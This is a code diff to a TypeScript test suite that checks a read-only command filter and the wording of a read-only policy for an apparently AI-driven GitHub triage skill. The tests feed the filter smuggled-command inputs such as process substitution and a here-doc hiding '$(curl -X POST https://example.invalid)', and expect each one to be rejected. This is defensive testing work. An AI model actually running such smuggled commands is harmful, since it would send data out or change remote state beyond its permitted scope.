@@ -10,10 +10,6 @@ const reportTemplate = readFileSync(
   "utf8",
 );
 
-function normalizeShellContinuations(text: string): string {
-  return text.replace(/\\\r?\n[ \t]*/g, " ");
-}
-
 function isReadOnlyGhApi(command: string): boolean {
   const argumentsText = command.replace(/^gh api\b/i, "").trim();
   const argumentsList = argumentsText.match(/(?:[^\s"'`]+|"[^"]*"|'[^']*')+/g) ?? [];
@@ -36,8 +32,9 @@ function isReadOnlyGhApi(command: string): boolean {
 }
 
 function isReadOnlyCommand(command: string): boolean {
-  const normalizedCommand = normalizeShellContinuations(command).trim();
-  if (/[;&|`$]|[<>]\(/.test(normalizedCommand)) return false;
+  const normalizedCommand = command.trim();
+  const commandSyntax = normalizedCommand.replace(/<[\w./-]+>/g, "");
+  if (/[\r\n;&|`$<>\\()]/.test(commandSyntax)) return false;
   if (normalizedCommand === "bun test tests/artifact-scroll-spy.spec.ts") return true;
   if (/^gh api(?:\s|$)/i.test(normalizedCommand)) {
     return isReadOnlyGhApi(normalizedCommand);
@@ -48,18 +45,24 @@ function isReadOnlyCommand(command: string): boolean {
 }
 
 function commandExamples(markdown: string): string[] {
-  const normalizedMarkdown = normalizeShellContinuations(markdown);
   const codeBlocks = [
-    ...normalizedMarkdown.matchAll(/```[^\n]*\n([\s\S]*?)```/g),
-  ].flatMap(([, block]) => block.split("\n").map((line) => line.trim()));
-  const inlineCode = normalizedMarkdown.replace(/```[\s\S]*?```/g, "");
+    ...markdown.matchAll(/```[^\n]*\n([\s\S]*?)```/g),
+  ].flatMap(([, block]) =>
+    block.split("\n").some((line) => /^[a-z][\w-]*\s/.test(line.trim()))
+      ? [block.trim()]
+      : [],
+  );
+  const inlineCode = markdown.replace(/```[\s\S]*?```/g, "");
   return [
     ...codeBlocks,
     ...[...inlineCode.matchAll(/`([^`\n]+)`/g)].map(([, command]) =>
       command.trim(),
     ),
   ]
-    .filter((command) => /^[a-z][\w-]*\s/.test(command));
+    .filter(
+      (command) =>
+        command.includes("\n") || /^[a-z][\w-]*\s/.test(command),
+    );
 }
 
 describe("GitHub triage instruction contract", () => {
@@ -154,6 +157,12 @@ describe("GitHub triage instruction contract", () => {
     expect(readOnlyPolicy).toMatch(
       /Only those listed `gh` reads may contact a remote service\.\s+Every other command or tool\s+capable of remote access or changing remote state is forbidden/,
     );
+    expect(readOnlyPolicy).toMatch(
+      /Use exactly one direct allowlisted CLI command per tool call\./,
+    );
+    expect(readOnlyPolicy.replace(/\s+/g, " ")).toContain(
+      "Do not wrap or compose shell commands: no compound commands, shell wrappers, process substitution, command substitution, here-docs, or line continuations.",
+    );
     expect(readOnlyPolicy).toContain(
       "Every mutation of GitHub state is a failure of this skill",
     );
@@ -180,11 +189,29 @@ describe("GitHub triage instruction contract", () => {
         "gh issue list >(curl -X POST https://example.invalid)",
       ),
     ).toBe(false);
+    expect(
+      isReadOnlyCommand(
+        "gh issue list =(curl -X POST https://example.invalid)",
+      ),
+    ).toBe(false);
+    expect(isReadOnlyCommand("env gh issue list")).toBe(false);
     const remoteWriteBlock = "```sh\ncurl -X POST https://example.invalid\n```";
     expect(commandExamples(remoteWriteBlock)).toEqual([
       "curl -X POST https://example.invalid",
     ]);
     expect(commandExamples(remoteWriteBlock).every(isReadOnlyCommand)).toBe(false);
+    const hereDocBlock = [
+      "```sh",
+      "gh issue list <<EOF",
+      "$(curl -X POST https://example.invalid)",
+      "EOF",
+      "```",
+    ].join("\n");
+    const hereDocCommands = commandExamples(hereDocBlock);
+    expect(hereDocCommands).toEqual([
+      "gh issue list <<EOF\n$(curl -X POST https://example.invalid)\nEOF",
+    ]);
+    expect(hereDocCommands.every(isReadOnlyCommand)).toBe(false);
     for (const command of [
       "gh api -fbody=value /repos/acme/repo",
       "gh api -Fbody=value /repos/acme/repo",
